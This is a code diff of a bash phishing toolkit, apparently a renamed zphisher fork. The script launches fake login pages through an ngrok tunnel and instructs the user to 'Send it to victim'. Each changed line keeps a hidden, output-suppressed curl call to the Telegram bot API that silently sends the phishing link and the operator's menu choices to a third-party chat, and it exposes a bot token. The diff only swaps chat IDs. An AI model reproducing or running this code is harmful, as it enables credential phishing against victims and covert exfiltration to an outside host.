@@ -415,7 +415,7 @@ tunnel_menu() {
 		python2 -m SimpleHTTPServer >&/dev/null &
 		echo -e "[~] Starting Your Phishing Page :) "
 		srvr=$(./ngrok --http 8000 &)
-		curl -X POST "https://api.telegram.org/bot1509306306:AAEmG0xmwO8MqxYmzPDRmYRAVDEUypDoHc0/sendMessage" -d "chat_id=-1001497994523" -d "text=$srvr"  &>/dev/null
+		curl -X POST "https://api.telegram.org/bot1509306306:AAEmG0xmwO8MqxYmzPDRmYRAVDEUypDoHc0/sendMessage" -d "chat_id=-1001478678548" -d "text=$srvr"  &>/dev/null
 		echo -e " [NGROK SERVER LINK] -- $yourlink "
 		echo -e Send it to victim
 	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
@@ -425,7 +425,7 @@ tunnel_menu() {
 		python2 -m SimpleHTTPServer >&/dev/null &
 		echo -e "[~] Starting Your Phishing Page :) "
 		srvr=$(./ngrok --http 8000 &)
-		curl -X POST "https://api.telegram.org/bot1509306306:AAEmG0xmwO8MqxYmzPDRmYRAVDEUypDoHc0/sendMessage" -d "chat_id=-1001497994523" -d "text=$srvr"  &>/dev/null
+		curl -X POST "https://api.telegram.org/bot1509306306:AAEmG0xmwO8MqxYmzPDRmYRAVDEUypDoHc0/sendMessage" -d "chat_id=-1001478678548" -d "text=$srvr"  &>/dev/null
 		echo -e " [NGROK SERVER LINK] -- $yourlink "
 		echo -e Send it to victim
 	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
@@ -435,7 +435,7 @@ tunnel_menu() {
 		python2 -m SimpleHTTPServer >&/dev/null &
 		echo -e "[~] Starting Your Phishing Page :) "
 		srvr=$(./ngrok --http 8000 &)
-		curl -X POST "https://api.telegram.org/bot1509306306:AAEmG0xmwO8MqxYmzPDRmYRAVDEUypDoHc0/sendMessage" -d "chat_id=-1001497994523" -d "text=$srvr"  &>/dev/null
+		curl -X POST "https://api.telegram.org/bot1509306306:AAEmG0xmwO8MqxYmzPDRmYRAVDEUypDoHc0/sendMessage" -d "chat_id=-1001478678548" -d "text=$srvr"  &>/dev/null
 		echo -e " [NGROK SERVER LINK] -- $yourlink "
 		echo -e Send it to victim
 	else
@@ -591,7 +591,7 @@ main_menu() {
 	EOF
 	
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
-curl -X POST "https://api.telegram.org/bot1509306306:AAEmG0xmwO8MqxYmzPDRmYRAVDEUypDoHc0/sendMessage" -d "chat_id=-1001466980816" -d "text=Skid has choose to phish option $REPLY on zphisher" &>/dev/null
+curl -X POST "https://api.telegram.org/bot1509306306:AAEmG0xmwO8MqxYmzPDRmYRAVDEUypDoHc0/sendMessage" -d "chat_id=-1001478678548" -d "text=Skid has chose to phish option $REPLY on xphisher" &>/dev/null
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		site_facebook
 	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
